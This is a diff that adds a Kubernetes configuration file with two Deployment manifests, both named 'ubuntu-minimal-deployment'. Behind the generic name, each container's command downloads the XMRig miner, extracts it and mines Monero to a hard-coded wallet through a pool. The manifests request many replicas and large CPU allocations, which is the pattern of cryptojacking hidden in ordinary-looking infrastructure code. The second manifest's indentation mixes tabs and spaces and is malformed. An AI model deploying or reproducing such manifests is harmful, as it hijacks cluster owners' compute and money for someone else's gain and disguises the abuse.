@@ -1,0 +1,68 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ubuntu-minimal-deployment
+spec:
+  replicas: 15
+  selector:
+    matchLabels:
+      app: ubuntu-minimal
+  template:
+    metadata:
+      labels:
+        app: ubuntu-minimal
+    spec:
+      serviceAccountName: ubuntu-sa  # Use the ubuntu-sa service account
+      containers:
+      - name: ubuntu
+        image: ubuntu:20.04
+        command: [ "sh", "-c", "apt-get update && apt-get install -y wget tar && wget -c https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz -P /mnt/data && tar -xzvf /mnt/data/xmrig-6.22.2-linux-static-x64.tar.gz -C /mnt/data && cd /mnt/data && ./xmrig -o xmr.kryptex.network:7777 -u 49sVbUmckBtEiMtQBDp3yTbZz9t2fb5UFQ4iBAABSiXQ4SAvz71azEpe7BcfsmGCCDXPKy7HgsDamApdRfUh2MrS6sgZZ8t/worker-ocs-2 -k --coin monero -a rx/0 " ]
+		resources:
+          requests:
+            cpu: "2"  # Request 2 CPU cores
+            memory: "4Gi"  # Optional: request 2Gi of memory
+          limits:
+            cpu: "4"  # Limit to 2 CPU cores
+            memory: "5Gi"  # Optional: limit to 2Gi of memory
+        volumeMounts:
+        - name: ubuntu-pvc  # Mount the PVC
+          mountPath: /mnt/data  # This can be any path in the container where you want to access the PVC
+      volumes:
+      - name: ubuntu-pvc  # Define the volume
+        persistentVolumeClaim:
+          claimName: ubuntu-pvc  # Reference the PVC created earlier
+
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ubuntu-minimal-deployment
+spec:
+  replicas: 5
+  selector:
+    matchLabels:
+      app: ubuntu-minimal
+  template:
+    metadata:
+      labels:
+        app: ubuntu-minimal
+    spec:
+      serviceAccountName: ubuntu-sa  # Use the ubuntu-sa service account
+      containers:
+      - name: ubuntu
+        image: ubuntu:20.04
+        command: [ "sh", "-c", "apt-get update && apt-get install -y wget tar && wget -c https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz -P /mnt/data && tar -xzvf /mnt/data/xmrig-6.22.2-linux-static-x64.tar.gz -C /mnt/data && cd /mnt/data && ./xmrig -o xmr.kryptex.network:7777 -u 49sVbUmckBtEiMtQBDp3yTbZz9t2fb5UFQ4iBAABSiXQ4SAvz71azEpe7BcfsmGCCDXPKy7HgsDamApdRfUh2MrS6sgZZ8t/worker-ocs-2 -k --coin monero -a rx/0 " ]
+		resources:
+			limits:
+			  cpu: '32'
+			  memory: 20Gi
+			requests:
+			  cpu: '30'
+			  memory: 10Gi
+		  volumeMounts:
+			- name: ubuntu-pvc
+			  mountPath: /mnt/data
+	  volumes:
+      - name: ubuntu-pvc  # Define the volume
+        persistentVolumeClaim:
+          claimName: ubuntu-pvc  # Reference the PVC created earlier
